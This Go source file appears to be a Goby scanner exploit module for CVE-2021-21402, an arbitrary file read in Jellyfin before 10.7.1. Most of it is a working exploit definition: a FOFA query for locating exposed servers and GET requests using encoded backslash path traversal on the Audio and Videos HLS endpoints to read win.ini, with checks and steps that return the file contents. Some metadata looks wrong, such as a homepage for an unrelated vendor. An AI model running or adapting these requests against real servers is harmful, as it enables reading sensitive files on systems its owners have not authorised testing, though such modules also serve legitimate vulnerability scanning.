package exploits

import "git.gobies.org/goby/goscanner/goutils"

func init() {
      expJson := `{
    "Name": "Jellyfin 10.7.0 任意文件读取",
    "Description": "Jellyfin是一个自由软件媒体系统。在10.7.1版本之前的Jellyfin中，对于某些端点，精心编制的请求将允许从Jellyfin服务器的文件系统读取任意文件。当使用Windows作为主机操作系统时，这个问题更为普遍。暴露于公共互联网的服务器有潜在的风险。",
    "Product": "Jellyfin",
    "Homepage": "https://www.weaver.com.cn/",
    "DisclosureDate": "2020-06-21",
    "Author": "om2bg0b3s2b_7fwgjxf-z-ckvv2m@open_wechat",
    "FofaQuery": "title=\"Jellyfin\" || body=\"http://jellyfin.media\"",
    "Level": "2",
    "CveID": "CVE-2021-21402",
    "CNNVD": [],
    "CNVD": [],
    "CVSS": "8.0",
    "Tags": [
        "文件读取"
    ],
    "VulType": [
        "文件读取"
    ],
    "Impact": "<p>Jellyfin是一个自由软件媒体系统。在10.7.1版本之前的Jellyfin中，对于某些端点，精心编制的请求将允许从Jellyfin服务器的文件系统读取任意文件。当使用Windows作为主机操作系统时，这个问题更为普遍。暴露于公共互联网的服务器有潜在的风险。攻击者可以读取任意文件以获取服务器的敏感信息</p>",
    "Recommendation": "<p>1、更新至10.7.1及以上版本：https://jellyfin.org/。</p><p>2、临时解决方案：用户可以通过对文件系统强制执行严格的安全权限来限制某些访问，但是建议尽快更新。</p>",
    "References": [
        "http://wiki.peiqi.tech"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "File",
            "type": "select",
            "value": "windows/win.ini",
            "show": ""
        }
    ],
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/Audio/1/hls/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/octet-stream"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "font",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "file",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "extension",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/Videos/1/hls/m/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/octet-stream"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "font",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "extension",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "file",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/Audio/1/hls/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/octet-stream"
                },
                "data_type": "text",
                "data": ""
            },
            "SetVariable": [
                "output|lastbody"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/Videos/1/hls/m/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/octet-stream"
                },
                "data_type": "text",
                "data": ""
            },
            "SetVariable": [
                "output|lastbody"
            ]
        }
    ],
    "PostTime": "2021-04-07 21:05:13",
    "GobyVersion": "1.8.255",
    "GobyQuery": "title=\"Jellyfin\" || body=\"http://jellyfin.media\"",
    "PocId": "10688"
}`

      ExpManager.AddExploit(NewExploit(
            goutils.GetFileName(),
            expJson,
            nil,
            nil,
      ))
}
